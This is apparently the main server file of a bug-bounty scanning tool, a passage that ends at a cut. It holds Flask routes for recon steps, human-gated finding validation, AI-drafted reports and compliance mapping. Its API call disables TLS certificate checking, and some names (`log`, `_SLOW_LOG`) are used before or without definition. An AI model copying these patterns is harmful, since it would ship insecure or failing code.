#!/usr/bin/env python3
"""BugScan ELITE — Server v2.0"""

# ── Auto-install missing dependencies ─────────────────────────────────────────
def _ensure_deps():
    """Auto-install required packages if missing."""
    import importlib.util, subprocess as _sp, sys as _sys
    REQUIRED = {
        'flask':      'flask',
        'flask_cors': 'flask-cors',
        'requests':   'requests',
        'dns':        'dnspython',
        'jwt':        'PyJWT',
        'yaml':       'pyyaml',
        'bs4':        'beautifulsoup4',
        'weasyprint': 'weasyprint',
        'dnslib':     'dnslib',
        'sublist3r':  'sublist3r',
        # crawl4ai: optional JS crawler — excluded (requires Playwright browser install)
    }
    missing = [pkg for mod, pkg in REQUIRED.items()
               if importlib.util.find_spec(mod) is None]
    if missing:
        print(f"  Auto-installing: {', '.join(missing)}")
        _sp.run(
            [_sys.executable, '-m', 'pip', 'install', '--break-system-packages', '-q'] + missing,
            capture_output=True
        )
_ensure_deps()

import os, json, time, threading, queue, re, logging, socket
_START_TIME = time.time()

# ── Module-level .env loader ───────────────────────────────────────────────────
# Runs at import time so gunicorn workers always have all API keys in os.environ
# regardless of whether start.sh exported them before launching gunicorn.
# Never overwrites vars that already exist in the environment.
def _load_dotenv():
    from pathlib import Path as _Path
    env_file = _Path(__file__).parent / ".env"
    if not env_file.exists():
        return 0
    loaded = 0
    try:
        for line in env_file.read_text(errors="replace").splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if "#" in line:
                line = line[:line.index("#")].rstrip()
            if "=" not in line:
                continue
            key, _, val = line.partition("=")
            key = key.strip()
            val = val.strip().strip('"').strip("'")
            if key and key.replace("_","").isalnum() and key not in os.environ:
                os.environ[key] = val
                loaded += 1
    except Exception:
        pass
    return loaded

_env_vars_loaded = _load_dotenv()
from pathlib import Path
from flask import Flask, request, Response, jsonify, send_file, stream_with_context
from flask_cors import CORS
# Storage — SQLite by default (USE_SQLITE=false to revert to JSON)
_use_sqlite = os.environ.get("USE_SQLITE","true").lower() not in ("0","false","no")
if _use_sqlite:
    try:
        from engine.storage_sqlite import StorageSQLite as Storage
    except ImportError:
        from storage import Storage
else:
    from storage import Storage
from recon import run_recon
from scanner import run_scan
from engine.waf import detect_waf
from engine.chain import find_chains
from engine.js_analyzer import analyze_all_js
from engine.asn import get_company_ranges
from engine.auth import AuthEngine
from engine.oob import get_oob_client
from engine.reporter import generate_h1_report, generate_full_report
from engine.screenshot import get_engine as get_screenshot_engine
from engine.diff import MonitorEngine
from engine.h1 import get_submitter

# ── Enterprise, Audit, Monitoring ─────────────────────────────────────────────
try:
    from engine.enterprise import (
        create_org, get_org, get_org_by_slug, list_orgs, update_org,
        create_team, get_team, list_teams,
        add_member, get_member, list_members, update_member_role,
        create_program, get_program, list_programs, update_program,
        is_in_scope, add_program_asset, list_program_assets,
        create_api_key, verify_api_key, revoke_api_key, list_api_keys,
        check_rate_limit, record_usage, get_usage_summary, can_start_scan,
    )
    from engine.audit_log import (
        audit, log_event, query_events, get_stats as audit_get_stats, get_logs,
        CATEGORY_AUTH, CATEGORY_SCAN, CATEGORY_FINDING, CATEGORY_PROGRAM,
        CATEGORY_ORG, CATEGORY_USER, CATEGORY_API_KEY, CATEGORY_EXPORT,
        CATEGORY_REPORT, CATEGORY_SYSTEM, CATEGORY_VALIDATION,
        SEV_INFO, SEV_NOTICE, SEV_WARNING, SEV_CRITICAL,
    )
    from engine.monitoring import (
        create_job as mon_create_job, get_job as mon_get_job,
        list_jobs as mon_list_jobs, update_job as mon_update_job,
        delete_job as mon_delete_job,
        take_snapshot, get_latest_snapshot, compute_delta,
        get_deltas, mark_notified, start_scheduler,
    )
    _ENTERPRISE_ENABLED = True
except Exception as _ent_err:
    _ENTERPRISE_ENABLED = False
    log.warning(f"[enterprise] import failed: {_ent_err}")
    def audit(action, **kw): pass
    def record_usage(*a, **kw): pass
    def check_rate_limit(k, **kw): return True, 999
    def can_start_scan(org_id): return True, "ok"

from engine.notify import get_notifier
try:
    from engine.mythos_loop import run_exploitation_loop, analyze_code_target, generate_hacktron_report
    from engine.poc_gtfo     import enforce_poc_gtfo, auto_generate_poc, generate_patch_suggestion, batch_enforce_poc
    from engine.xbow_replay  import replay_finding, batch_replay, regression_check
    _ELITE_LOOP = True
except Exception as _loop_err:
    _ELITE_LOOP = False
from engine.ai_analyst import (generate_executive_summary, enhance_finding,
                                generate_retest_plan, analyze_attack_surface,
                                smart_payload_suggestion)
from engine.retest import retest_all, retest_summary
try:
    from engine.xbow_validator  import validate_evidence, batch_validate_evidence
    from engine.mythos_analyzer import analyze_root_cause, generate_mythos_report
    _XBOW_ENABLED = True
except Exception as _xe:
    _XBOW_ENABLED = False
from engine.rich_notify import get_rich_notifier

BASE_DIR = Path(__file__).parent
DATA_DIR = BASE_DIR / "data"
DATA_DIR.mkdir(exist_ok=True)
SNAP_DIR = DATA_DIR / "snapshots"
SNAP_DIR.mkdir(exist_ok=True)

# Structured logging — supports both human-readable (default) and JSON (TMR_LOG_JSON=1)
_LOG_JSON = os.environ.get("TMR_LOG_JSON","0") == "1"
if _LOG_JSON:
    import json as _json_log
    class _JSONFormatter(logging.Formatter):
        def format(self, record):
            return _json_log.dumps({
                "ts": self.formatTime(record, "%Y-%m-%dT%H:%M:%S"),
                "level": record.levelname, "logger": record.name,
                "msg": record.getMessage(),
                "exc": self.formatException(record.exc_info) if record.exc_info else None,
            })
    _root_handler = logging.StreamHandler()
    _root_handler.setFormatter(_JSONFormatter())
    logging.basicConfig(level=logging.INFO, handlers=[_root_handler])
else:
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s"
    )
log = logging.getLogger("bugscan.elite")

# ── Local IP detection ────────────────────────────────────────────────────────
def _get_local_ip() -> str:
    """Get real LAN IP of this machine (not 127.0.0.1)."""
    import re as _re
    # UDP connect trick — no traffic sent, gets routing interface
    try:
        _s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        _s.settimeout(0)
        _s.connect(("10.255.255.255", 1))
        _ip = _s.getsockname()[0]
        _s.close()
        if not _ip.startswith("127."):
            return _ip
    except: pass
    # Try all interfaces
    try:
        for _info in socket.getaddrinfo(socket.gethostname(), None):
            _ip = _info[4][0]
            if ":" not in _ip and not _ip.startswith("127.") and not _ip.startswith("0."):
                return _ip
    except: pass
    # /proc/net/fib_trie fallback (Linux)
    try:
        with open("/proc/net/fib_trie") as _f:
            _txt = _f.read()
        for _ip in _re.findall(r"(\d+\.\d+\.\d+\.\d+)", _txt):
            if not _ip.startswith("127.") and not _ip.startswith("0.") and not _ip.startswith("169."):
                _octets = list(map(int, _ip.split(".")))
                if _octets[0] in (10, 172, 192):  # Private ranges only
                    return _ip
    except: pass
    return "127.0.0.1"

LOCAL_IP = _get_local_ip()
log.info(f"[net] Local IP: {LOCAL_IP}")


app     = Flask(__name__, static_folder=str(BASE_DIR / "static"))
_CORS_ORIGINS = [o.strip() for o in
    os.environ.get("TMR_CORS_ORIGINS",
                   "http://localhost:*,http://127.0.0.1:*").split(",") if o.strip()]
CORS(app, origins=_CORS_ORIGINS, supports_credentials=True)
# Initialize storage (JSON default, SQLite if USE_SQLITE=true)
db      = Storage(DATA_DIR)
log.info(f"[storage] {type(db).__name__} at {DATA_DIR}")
MONITOR = MonitorEngine(SNAP_DIR)

_sessions = {}
_lock = threading.Lock()

# Live scan feed queues (per domain)
import queue as _queue_module
_scan_queues      = {}
_scan_queues_lock = threading.Lock()

# Concurrent scan limiter — prevent CPU spikes from uncontrolled parallel scans
MAX_CONCURRENT_SCANS = int(os.environ.get("TMR_MAX_CONCURRENT_SCANS", "3"))
_scan_semaphore = threading.Semaphore(MAX_CONCURRENT_SCANS)
_active_scans: dict = {}   # {domain: start_time}
_active_scans_lock = threading.Lock()


def _acquire_scan_slot(domain: str) -> bool:
    """Acquire a scan slot. Returns False if at capacity (non-blocking check)."""
    with _active_scans_lock:
        if len(_active_scans) >= MAX_CONCURRENT_SCANS:
            log.warning(
                f"[scan] MAX_CONCURRENT_SCANS={MAX_CONCURRENT_SCANS} reached"
                f" — {domain} queued"
            )
            return False
        _active_scans[domain] = time.time()
        return True


def _release_scan_slot(domain: str):
    with _active_scans_lock:
        _active_scans.pop(domain, None)


def _domain(s):
    s = (s or "").strip().lower()
    try:
        import urllib.parse as _ulp
        s = _ulp.unquote(s)
    except Exception:
        pass
    s = re.sub(r'^https?://', '', s).split('/')[0].split('?')[0]
    # Reject shell injection chars and spaces
    if re.search(r'[;|&<>"\' \t\r\n\x00]', s): return ""
    # Reject wildcards
    if '*' in s: return ""
    # Reject localhost / loopback
    if s in ("localhost","localhost.local"): return ""
    if re.match(r'^127\.', s) or re.match(r'^0\.0\.0', s): return ""
    # Reject bare IPv4
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}$', s): return ""
    # Must look like a valid hostname with TLD
    if s and not re.match(r'^[a-z0-9][a-z0-9.\-]*\.[a-z]{2,}$', s): return ""
    return s


def _sess(domain):
    with _lock:
        if domain not in _sessions:
            _sessions[domain] = {
                "recon_q": None, "scan_q": None,
                "recon_t": None, "scan_t": None,
                "waf":     None, "asn":    None,
                "auth":    AuthEngine(),
                "js":      [],   "chains": [],
            }
        return _sessions[domain]

def _sse(data): return f"data: {json.dumps(data)}\n\n"

# ── Pages ─────────────────────────────────────────────────────────────────────
# ══ JXSCOUT + HUNTER TOOLS ═══════════════════════════════════════════════════

# ── Login rate limiting — simple in-memory counter ─────────────────────────
import collections as _coll, threading as _thr

_LOGIN_ATTEMPTS = _coll.defaultdict(list)   # {ip: [timestamps]}
_LOGIN_LOCK     = _thr.Lock()
_MAX_ATTEMPTS   = 10    # per window
_ATTEMPT_WINDOW = 300   # seconds (5 min)

def _check_login_rate(ip: str) -> bool:
    """Return True if login is allowed, False if rate limited."""
    import time as _t
    now = _t.time()
    with _LOGIN_LOCK:
        attempts = [ts for ts in _LOGIN_ATTEMPTS[ip] if now - ts < _ATTEMPT_WINDOW]
        _LOGIN_ATTEMPTS[ip] = attempts
        if len(attempts) >= _MAX_ATTEMPTS:
            return False
        _LOGIN_ATTEMPTS[ip].append(now)
    return True

def _record_login_fail(ip: str):
    pass  # already recorded in _check_login_rate


# ══ SECRET HUNTER + STORAGE BACKEND ═════════════════════════════════════════

# ══ HEALTH + SECURITY HEADERS ═══════════════════════════════════════════════

# ══ FIREBASE POC GENERATOR ════════════════════════════════════════════════════
# Based on generate_poc_from_results.py from unified_secret_hunter toolkit

# ══════════════════════════════════════════════════════════════════════════════
# NUCLEI ENGINE — 9,000+ templates, CVE coverage, plugin system
# ══════════════════════════════════════════════════════════════════════════════

# ══ GLOBAL ERROR HANDLING + REQUEST TIMING ════════════════════════════════════

import uuid as _uuid_mod

@app.before_request
def _before():
    """Tag every request with an ID and start time."""
    import time as _t
    from flask import g
    g.request_id = _uuid_mod.uuid4().hex[:8]
    g.t0 = _t.time()

@app.after_request
def _after(response):
    """Log slow requests, record in _SLOW_LOG ring buffer, inject request ID."""
    import time as _t
    from flask import g
    elapsed = _t.time() - getattr(g, 't0', _t.time())
    if elapsed > 2.0:
        log.warning(f"[slow] {request.method} {request.path} took {elapsed:.2f}s")
        global _SLOW_LOG, _SLOW_LOG_MAX
        _SLOW_LOG.append({
            "method":    request.method,
            "path":      request.path,
            "duration_s": round(elapsed, 2),
            "timestamp": _t.strftime("%Y-%m-%dT%H:%M:%SZ", _t.gmtime()),
            "query":     request.query_string.decode()[:100],
        })
        if len(_SLOW_LOG) > _SLOW_LOG_MAX:
            _SLOW_LOG = _SLOW_LOG[-_SLOW_LOG_MAX:]
    response.headers['X-Request-Id'] = getattr(g, 'request_id', '')
    return response

@app.errorhandler(Exception)
def _handle_error(e):
    """
    Global exception handler — returns JSON instead of HTML stack traces.
    Without this, a crashed route returns an HTML 500 to fetch() calls,
    which the frontend ignores silently, making bugs invisible.
    """
    import traceback as _tb
    err_id = _uuid_mod.uuid4().hex[:8]
    log.error(f"[error:{err_id}] {request.method} {request.path}: {e}\n"
              + _tb.format_exc()[-1000:])
    code = getattr(e, 'code', 500)
    if not isinstance(code, int) or code < 400:
        code = 500
    return jsonify({
        "error":      str(e),
        "error_id":   err_id,
        "path":       request.path,
        "method":     request.method,
        "status":     code,
    }), code

@app.errorhandler(404)
def _not_found(e):
    return jsonify({"error": "Not found", "path": request.path}), 404

@app.errorhandler(405)
def _method_not_allowed(e):
    return jsonify({"error": "Method not allowed",
                    "path": request.path, "method": request.method}), 405


# ══ AI RECON INTELLIGENCE ════════════════════════════════════════════════════



# ══ NUCLEI AUTO-INSTALL + TEMPLATE SYNC ════════════════════════════════════
def _nuclei_startup():
    """Background: install nuclei binary + update 9,000+ templates on startup."""
    import time
    time.sleep(5)  # let Flask fully start first
    try:
        from engine.nuclei_engine import install_nuclei, update_templates, get_binary, start_auto_updater
        
        # Install binary if missing
        if not get_binary():
            log.info("[nuclei] binary not found — attempting auto-install...")
            result = install_nuclei()
            if result.get("ok"):
                log.info(f"[nuclei] installed: {result.get('version','')}")
            else:
                log.warning(f"[nuclei] install failed: {result.get('error','')}")
        
        # Update/download templates
        log.info("[nuclei] checking template library...")
        t_result = update_templates()
        if t_result.get("ok"):
            log.info(f"[nuclei] {t_result.get('templates', 0)} templates ready")
        
        # Start daily auto-updater
        start_auto_updater()
        log.info("[nuclei] startup complete")
    except Exception as e:
        log.warning(f"[nuclei] startup error: {e}")

import threading as _th
_th.Thread(target=_nuclei_startup, name="nuclei-startup", daemon=True).start()

# ══ PLUGIN STORE + NUCLEI INTEGRATION ════════════════════════════════════════

# ══ TOOLS MANAGER + EXTENDED RECON ═══════════════════════════════════════════

# ══ JS DEEP ANALYSIS ═════════════════════════════════════════════════════════

# ══ ELITE SECRETS ENGINE ═════════════════════════════════════════════════════

# ══ BULK SCAN ═════════════════════════════════════════════════════════════════

# ══ JXSCOUT V2 ════════════════════════════════════════════════════════════════

def _count_recon_sources():
    """Count configured vs total recon API sources."""
    api_vars = [
        "SHODAN_API_KEY","SECURITYTRAILS_API_KEY","VIRUSTOTAL_API_KEY","VT_API_KEY",
        "GITHUB_TOKEN","CHAOS_API_KEY","CENSYS_API_ID","NETLAS_API_KEY","ZOOMEYE_API_KEY",
        "FOFA_EMAIL","HUNTER_API_KEY","BINARYEDGE_API_KEY","INTELX_API_KEY","C99_API_KEY",
        "QUAKE_TOKEN","THREATBOOK_API_KEY","DNSDB_API_KEY","BUILTWITH_API_KEY",
        "FULLHUNT_API_KEY","LEAKIX_API_KEY","BEVIGIL_API_KEY","URLSCAN_API_KEY",
    ]
    configured = sum(1 for v in api_vars if os.environ.get(v,"").strip())
    # Free sources always available
    free = 15  # crt.sh, certspotter, hackertarget, alienvault, urlscan,
               # rapiddns, anubis, bufferover, robtex, dnsrepo, facebook_ct,
               # sublist3r, thc_api, waymore, archive_urls
    return {"configured": configured, "free": free, "total_api": len(api_vars),
            "total_active": configured + free}


# ══ REPORTING ════════════════════════════════════════════════════════════════

# ══════════════════════════════════════════════════════════════════════════════
# MISSING ROUTES — Added to fix frontend 404 errors
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/recon/steps")
def recon_steps():
    """Return available recon pipeline steps for the UI."""
    steps = [
        {"id":"subdomains","label":"Subdomain Enum","icon":"🌐","desc":"Passive + active subdomain discovery"},
        {"id":"probe",     "label":"HTTP Probe",    "icon":"🔗","desc":"Live host detection via httpx/httprobe"},
        {"id":"ports",     "label":"Port Scan",     "icon":"⬡","desc":"Full 65,535 TCP port scan with naabu/nmap"},
        {"id":"fingerprint","label":"Fingerprint",  "icon":"🔍","desc":"Tech stack, WAF, CDN detection"},
        {"id":"crawl",     "label":"Crawl",         "icon":"🕷","desc":"Deep crawl with katana + gospider"},
        {"id":"endpoints", "label":"Endpoints",     "icon":"📌","desc":"Parameter discovery and endpoint mapping"},
        {"id":"js",        "label":"JS Analysis",   "icon":"📜","desc":"JS file analysis and secret extraction"},
    ]
    return jsonify({"steps": steps, "total": len(steps)})



# ── AI Validation Pipeline ────────────────────────────────────────────────────

@app.route("/ai/validation/queue")
def ai_validation_queue():
    """
    GET /ai/validation/queue?status=pending&limit=50

    Returns findings awaiting human review.
    status=pending  → not yet reviewed (default)
    status=approved → human-approved
    status=rejected → human-rejected
    """
    from engine.ai_validator import get_validation_queue
    status = request.args.get("status", "pending")
    limit  = min(int(request.args.get("limit", 50)), 200)
    items  = get_validation_queue(status=status, limit=limit)
    return jsonify({
        "status_filter": status,
        "count":         len(items),
        "items":         items,
        "note":          "Human approval required before any escalation. "
                         "POST /ai/validation/approve or /ai/validation/reject to review.",
    })


@app.route("/ai/validation/approve", methods=["POST"])
def ai_validation_approve():
    """
    POST /ai/validation/approve  {"id": "...", "notes": "..."}

    Human approves a validated finding for report generation.
    This does NOT submit anything — it only unlocks /report/draft.
    """
    from engine.ai_validator import human_decision as _hd
    p    = request.get_json(silent=True) or {}
    vid  = p.get("id","").strip()
    note = p.get("notes","").strip()[:500]
    if not vid:
        return jsonify({"error": "id required"}), 400
    ok = _hd(vid, "approved", note)
    if ok:
        log.info(f"[ai-validate] human approved id={vid}")
        return jsonify({"ok": True, "id": vid, "decision": "approved",
                        "next": f"/report/draft?id={vid}"})
    return jsonify({"error": "not found or already decided"}), 404


@app.route("/ai/validation/reject", methods=["POST"])
def ai_validation_reject():
    """
    POST /ai/validation/reject  {"id": "...", "notes": "..."}

    Human rejects a finding — archived, no report generated.
    """
    from engine.ai_validator import human_decision as _hd
    p    = request.get_json(silent=True) or {}
    vid  = p.get("id","").strip()
    note = p.get("notes","").strip()[:500]
    if not vid:
        return jsonify({"error": "id required"}), 400
    ok = _hd(vid, "rejected", note)
    if ok:
        log.info(f"[ai-validate] human rejected id={vid}")
        return jsonify({"ok": True, "id": vid, "decision": "rejected"})
    return jsonify({"error": "not found or already decided"}), 404


@app.route("/ai/validation/submit", methods=["POST"])
def ai_validation_submit():
    """
    POST /ai/validation/submit — intentionally blocked.
    Automatic report submission is not permitted.
    Human must submit reports through official platform UI.
    """
    return jsonify({
        "error":       "automatic_submission_not_permitted",
        "reason":      "Reports must be submitted manually by a human analyst.",
        "policy":      "No automatic report submission under any circumstances.",
    }), 403


# ── Report Draft Generator ────────────────────────────────────────────────────

@app.route("/report/draft")
def report_draft():
    """
    GET /report/draft?id=FINDING_ID

    Generates a draft report for a human-approved validation item.
    Requires human_decision='approved' — cannot be bypassed.

    Returns a structured draft for analyst review. Does NOT submit anything.
    Report includes: summary, path only (no querystring), impact, safe
    reproduction outline, evidence summary, remediation, confidence.

    [report] draft generated id=...
    """
    from engine.ai_validator import get_validation_item, _safe_url
    from engine.notify import safe_notification_url

    vid = request.args.get("id","").strip()
    if not vid:
        return jsonify({"error": "id required"}), 400

    item = get_validation_item(vid)
    if not item:
        return jsonify({"error": "validation item not found", "id": vid}), 404

    # Hard gate: only approved items get drafts
    if item.get("human_decision") != "approved":
        return jsonify({
            "error":          "human_approval_required",
            "id":             vid,
            "current_status": item.get("human_decision") or "pending",
            "note":           "POST /ai/validation/approve first.",
        }), 403

    bug_type = item.get("bug_type", "unknown")
    domain   = item.get("domain", "")
    url_safe = item.get("url_safe") or ""
    path     = url_safe.split("//")[-1].split("/",1)[-1] if "//" in url_safe else url_safe
    severity = item.get("severity", "medium")
    conf     = item.get("confidence", 0)
    reason   = item.get("ai_reason", "")
    method   = item.get("validation_method", "")

    # ── Try AI-assisted draft if API key available ───────────────────────────
    ai_summary       = ""
    ai_impact        = ""
    ai_remediation   = ""
    ai_patch_lang    = "generic"
    ai_patch_vuln    = ""
    ai_patch_fixed   = ""
    ai_patch_explain = ""
    api_key = os.environ.get("ANTHROPIC_API_KEY","")
    if api_key:
        try:
            import urllib.request as _ur, ssl
            prompt = f"""You are a security report assistant. Write a professional bug report draft WITH a code patch suggestion.

Finding:
- Type: {bug_type}
- Severity: {severity}
- Domain: {domain}
- Path: /{path.split('?')[0]}
- Confidence: {conf}
- Validation method: {method}

Return ONLY this JSON (no other text, no markdown):
{{
  "summary": "<one sentence summary — no payloads, no exploit details>",
  "impact": "<2-3 sentences on business impact — no attack details>",
  "remediation": "<2-3 sentences on how to fix>",
  "patch_language": "<python|javascript|java|php|go|ruby|generic>",
  "patch_vulnerable": "<vulnerable code snippet — 1-3 lines max, no payloads>",
  "patch_fixed": "<fixed code snippet — 1-3 lines showing the safe pattern>",
  "patch_explanation": "<one sentence explaining what changed and why it is safe>"
}}

Rules:
- summary, impact, remediation: professional analyst tone, no payloads, no exploit syntax
- patch_vulnerable: show the unsafe pattern (e.g. string concatenation in SQL)
- patch_fixed: show the safe pattern (e.g. parameterized query)
- patch_explanation: safe, educational, no attack instructions
- Path must not include query parameters"""

            payload = json.dumps({
                "model": "claude-sonnet-4-20250514",
                "max_tokens": 600,
                "messages": [{"role":"user","content":prompt}]
            }).encode()
            ctx = ssl.create_default_context()
            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            req = _ur.Request("https://api.anthropic.com/v1/messages", data=payload,
                headers={"x-api-key":api_key,"anthropic-version":"2023-06-01",
                         "content-type":"application/json"}, method="POST")
            with _ur.urlopen(req, timeout=15, context=ctx) as resp:
                data = json.loads(resp.read())
            text = "".join(b.get("text","") for b in data.get("content",[]) if b.get("type")=="text")
            text = re.sub(r"```(?:json)?|```","",text).strip()
            ai_draft = json.loads(text)
            ai_summary        = ai_draft.get("summary","")
            ai_impact         = ai_draft.get("impact","")
            ai_remediation    = ai_draft.get("remediation","")
            ai_patch_lang     = ai_draft.get("patch_language","generic")
            ai_patch_vuln     = ai_draft.get("patch_vulnerable","")
            ai_patch_fixed    = ai_draft.get("patch_fixed","")
            ai_patch_explain  = ai_draft.get("patch_explanation","")
        except Exception as e:
            log.debug(f"[report] AI draft error: {e}")

    # ── Build draft report ───────────────────────────────────────────────────
    vuln_labels = {
        "xss":"Cross-Site Scripting","sqli":"SQL Injection","lfi":"Local File Inclusion",
        "ssrf":"Server-Side Request Forgery","ssti":"Server-Side Template Injection",
        "rce":"Remote Code Execution","idor":"Insecure Direct Object Reference",
        "open_redirect":"Open Redirect","cors":"CORS Misconfiguration",
        "cache_poison":"Cache Poisoning","crlf":"CRLF Injection",
        "xxe":"XML External Entity","host_header":"Host Header Injection",
        "prototype":"Prototype Pollution","info_disclosure":"Information Disclosure",
    }
    vuln_label = vuln_labels.get(bug_type.lower(), bug_type.upper())
    path_only  = ("/" + path.split("?")[0].lstrip("/"))[:200]

    draft = {
        "id":          vid,
        "status":      "draft",
        "title":       f"[{severity.upper()}] {vuln_label} — {domain}",
        "summary":     ai_summary or f"A potential {vuln_label} signal was detected on {domain}.",
        "endpoint":    path_only,
        "domain":      domain,
        "severity":    severity,
        "confidence":  conf,
        "impact":      ai_impact or (
            f"A confirmed {vuln_label} vulnerability could allow an attacker to "
            f"compromise the affected functionality. Impact depends on application context."
        ),
        "safe_reproduction_outline": (
            "1. Navigate to the affected endpoint\n"
            f"2. Apply {method.replace('_',' ')} validation technique\n"
            "3. Observe response difference or callback\n"
            "4. Document evidence (no payload details in report)"
        ),
        "evidence_summary":  f"Validation method: {method}. Confidence: {conf}%. "
                             f"AI triage: {item.get('ai_decision','needs_review')}. "
                             + (f"Notes: {reason[:120]}" if reason else ""),
        "remediation":  ai_remediation or (
            f"Review and sanitize all inputs at the affected endpoint. "
            f"Apply appropriate output encoding and security controls for {vuln_label}. "
            f"Consult OWASP guidance for {bug_type.upper()} prevention."
        ),
        # TASK 2 — validation rules embedded in report
        "validation_rules": {
            "allowed_methods": __import__('engine.ai_validator',fromlist=['get_validation_rules']).get_validation_rules(bug_type).get("allowed", []),
            "blocked_actions": __import__('engine.ai_validator',fromlist=['get_validation_rules']).get_validation_rules(bug_type).get("blocked", []),
            "probe_description": __import__('engine.ai_validator',fromlist=['get_validation_rules']).get_validation_rules(bug_type).get("probe_desc",""),
            "validation_type": __import__('engine.ai_validator',fromlist=['get_validation_rules']).get_validation_rules(bug_type).get("validation_type",""),
        },
        # TASK 3 — evidence collection (safe fields only)
        "evidence_bundle": {
            "baseline_status":  item.get("safe_evidence",[{}])[0].get("baseline_status",0) if item.get("safe_evidence") else 0,
            "probe_status":     item.get("safe_evidence",[{}])[0].get("probe_status",0) if item.get("safe_evidence") else 0,
            "response_diff":    item.get("safe_evidence",[{}])[0].get("diff_summary","") if item.get("safe_evidence") else "",
            "headers_changed":  [],
            "oob_confirmed":    bool(item.get("safe_evidence",[{}])[0].get("oob_event_id")) if item.get("safe_evidence") else False,
            "payload_redacted": True,   # ALWAYS True — never stored
        },
        # TASK 4 — analyst report format
        "analyst_report_lines": [
            f"Potential {vuln_label} signal",
            f"Path: /{path_only}",
            f"Confidence: {conf}",
            f"Validation: {method.replace('_',' ')} observed",
            "Status: requires analyst review",
        ],
        "requires_human_review": True,
        "auto_submitted":        False,
        "submission_note":       "This draft must be reviewed and submitted manually by a human analyst.",
        "patch_suggestion": {
            "language":     ai_patch_lang     if ai_patch_lang    else "generic",
            "vulnerable":   ai_patch_vuln     if ai_patch_vuln    else f"# Review {bug_type} implementation at {path_only}",
            "fixed":        ai_patch_fixed    if ai_patch_fixed   else f"# Apply secure coding pattern for {bug_type}",
            "explanation":  ai_patch_explain  if ai_patch_explain else f"Implement secure coding practices to prevent {vuln_label}.",
            "note":         "Patch is AI-generated. Review before applying. Test in staging first.",
        },
        "generated_at": time.time(),
    }

    log.info(f"[report] draft generated id={vid} bug={bug_type} confidence={conf}")

    return jsonify(draft)


@app.route("/ai/coach", methods=["POST"])
def ai_coach():
    """AI coaching tips during scan — context-aware suggestions."""
    try:
        payload = request.get_json(silent=True, force=True) or {}
        d       = _domain(payload.get("domain",""))
        phase   = payload.get("phase","scan")
        context = payload.get("context",{})
        tip = f"💡 Pro tip: For {phase} phase, focus on high-value endpoints first. Check admin panels and API endpoints."
        return jsonify({"ok":True,"tip":tip,"phase":phase})
    except Exception as e:
        return jsonify({"ok":True,"tip":"💡 Keep scanning — every endpoint is a potential finding.","error":str(e)})


@app.route("/apex/graph/<path:domain>")
def apex_graph(domain):
    """Return attack graph data for D3 visualization."""
    try:
        d = _domain(domain)
        findings = db.get_findings(d)
        hosts    = db.get_hosts(d)
        nodes, links = [], []
        # Root node
        nodes.append({"id":"root","label":d,"type":"domain","severity":"info"})
        # Host nodes
        for h in (hosts.get("active",[]) or [])[:20]:
            hid = f"host_{h}"
            nodes.append({"id":hid,"label":h,"type":"host","severity":"info"})
            links.append({"source":"root","target":hid})
        # Finding nodes
        for i,f in enumerate(findings[:30]):
            fid = f"finding_{i}"
            nodes.append({"id":fid,"label":f.get("title","Finding"),"type":"finding",
                         "severity":f.get("severity","info"),"url":f.get("url","")})
            # Link to relevant host
            url = f.get("url","")
            matched_host = next((h for h in (hosts.get("active",[]) or []) if h in url), None)
            source = f"host_{matched_host}" if matched_host else "root"
            links.append({"source":source,"target":fid})
        return jsonify({"nodes":nodes,"links":links,"total_findings":len(findings)})
    except Exception as e:
        return jsonify({"nodes":[],"links":[],"error":str(e)})


@app.route("/attack_graph/<path:domain>")
def attack_graph(domain):
    """Attack graph — alias for apex graph with richer data."""
    return apex_graph(domain)


@app.route("/compliance/<path:domain>")
def compliance_report(domain):
    """Compliance mapping for findings (OWASP, PCI-DSS, GDPR, CWE)."""
    try:
        d = _domain(domain)
        findings = db.get_findings(d)
        OWASP = {
            "sqli":"A03:2021 Injection","xss":"A03:2021 Injection",
            "ssrf":"A10:2021 SSRF","idor":"A01:2021 Broken Access Control",
            "lfi":"A05:2021 Security Misconfiguration","rce":"A03:2021 Injection",
            "xxe":"A05:2021 Security Misconfiguration","jwt":"A02:2021 Cryptographic Failures",
            "cors":"A05:2021 Security Misconfiguration","expose":"A05:2021 Security Misconfiguration",
        }
        CWE = {
            "sqli":"CWE-89","xss":"CWE-79","ssrf":"CWE-918","idor":"CWE-639",
            "lfi":"CWE-22","rce":"CWE-78","xxe":"CWE-611","cors":"CWE-346",
        }
        mapped = []
        for f in findings:
            bug = f.get("bug","").lower()
            mapped.append({
                "title":    f.get("title",""),
                "severity": f.get("severity","info"),
                "url":      f.get("url",""),
                "owasp":    OWASP.get(bug,"A05:2021 Security Misconfiguration"),
                "cwe":      CWE.get(bug,"CWE-200"),
                "pci":      "Req 6.4" if bug in ("sqli","xss","rce") else "Req 6.5",
            })
        return jsonify({"compliance":mapped,"total":len(mapped),"domain":d})
    except Exception as e:
        return jsonify({"compliance":[],"error":str(e)})


@app.route("/compliance/cvss/<path:domain>")
def compliance_cvss(domain):
    """CVSS scores for all findings."""
    try:
        d = _domain(domain)
        findings = db.get_findings(d)
        CVSS = {"critical":9.8,"high":7.5,"medium":5.0,"low":2.5,"info":0.0}
        cvss_data = []
        for f in findings:
            sev = f.get("severity","info").lower()
            cvss_data.append({
                "title":   f.get("title",""),
                "severity":sev,
                "cvss":    CVSS.get(sev, 0.0),
                "vector":  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U" if sev=="critical" else "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U",
                "url":     f.get("url",""),
            })
        return jsonify({"cvss":cvss_data,"domain":d})
    except Exception as e:
        return jsonify({"cvss":[],"error":str(e)})


@app.route("/plugins/<plugin_id>", methods=["DELETE"])
def plugin_delete(plugin_id):
    """Delete a community plugin."""
    try:
        import json as _json
        plugins_file = Path("data/plugins.json")
        if plugins_file.exists():
            plugins = _json.loads(plugins_file.read_text())
            plugins = [p for p in plugins if str(p.get("id","")) != str(plugin_id)]
            plugins_file.write_text(_json.dumps(plugins, indent=2))
        return jsonify({"ok":True,"deleted":plugin_id})
    except Exception as e:
        return jsonify({"ok":False,"error":str(e)}), 500


@app.route("/proxy/drop", methods=["POST"])
def proxy_drop_forward():
    """Drop (forward without interception) a proxied request."""
    try:
